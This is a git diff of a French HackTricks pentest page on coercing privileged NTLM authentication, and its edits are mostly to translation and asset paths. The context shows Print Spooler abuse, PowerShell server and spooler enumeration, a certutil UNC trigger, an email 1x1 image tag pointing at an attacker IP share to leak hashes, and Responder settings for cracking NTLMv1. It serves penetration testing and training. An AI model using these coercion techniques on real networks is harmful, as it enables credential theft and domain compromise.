@@ -1,15 +1,15 @@
 # Forcer l'authentification privilégiée NTLM
 
 {% hint style="success" %}
-Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Apprenez et pratiquez le hacking AWS :<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Apprenez et pratiquez le hacking GCP : <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Soutenir HackTricks</summary>
 
 * Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
-* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
 * **Partagez des astuces de hacking en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.
 
 </details>
@@ -22,7 +22,7 @@ Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt=
 ## Abus du service Spooler
 
 Si le service _**Print Spooler**_ est **activé**, vous pouvez utiliser des identifiants AD déjà connus pour **demander** au serveur d'impression du contrôleur de domaine une **mise à jour** sur les nouvelles tâches d'impression et simplement lui dire de **envoyer la notification à un système**.\
-Notez que lorsque l'imprimante envoie la notification à des systèmes arbitraires, elle doit **s'authentifier contre** ce **système**. Par conséquent, un attaquant peut faire en sorte que le service _**Print Spooler**_ s'authentifie contre un système arbitraire, et le service utilisera **le compte d'ordinateur** dans cette authentification.
+Notez que lorsque l'imprimante envoie la notification à des systèmes arbitraires, elle doit **s'authentifier contre** ce **système**. Par conséquent, un attaquant peut faire en sorte que le service _**Print Spooler**_ s'authentifie contre un système arbitraire, et le service **utilisera le compte d'ordinateur** dans cette authentification.
 
 ### Trouver des serveurs Windows sur le domaine
 
@@ -32,7 +32,7 @@ Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (Operati
 ```
 ### Finding Spooler services listening
 
-En utilisant un @mysmartlogin légèrement modifié (Vincent Le Toux) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), vérifiez si le service Spooler écoute :
+En utilisant un @mysmartlogin légèrement modifié (Vincent Le Toux) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), vérifiez si le service Spooler est à l'écoute :
 ```bash
 . .\Get-SpoolStatus.ps1
 ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
@@ -101,7 +101,7 @@ certutil.exe -syncwithWU  \\127.0.0.1\share
 
 ### Via email
 
-If you know the **email address** of the user that logs inside a machine you want to compromise, you could just send him an **email with a 1x1 image** such as
+Si vous connaissez l'**adresse email** de l'utilisateur qui se connecte à une machine que vous souhaitez compromettre, vous pourriez simplement lui envoyer un **email avec une image 1x1** telle que
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
@@ -116,19 +116,19 @@ Si vous pouvez effectuer une attaque MitM sur un ordinateur et injecter du HTML 
 ## Cracking NTLMv1
 
 Si vous pouvez capturer [les défis NTLMv1 lisez ici comment les craquer](../ntlm/#ntlmv1-attack).\
-_Rappelez-vous que pour craquer NTLMv1, vous devez définir le défi Responder sur "1122334455667788"_
+&#xNAN;_&#x52;appelez-vous qu'afin de craquer NTLMv1, vous devez définir le défi Responder sur "1122334455667788"_
 
 {% hint style="success" %}
-Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Apprenez et pratiquez le hacking AWS :<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Apprenez et pratiquez le hacking GCP : <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Soutenir HackTricks</summary>
 
 * Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
-* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.
+* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
+* **Partagez des astuces de hacking en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.
 
 </details>
 {% endhint %}
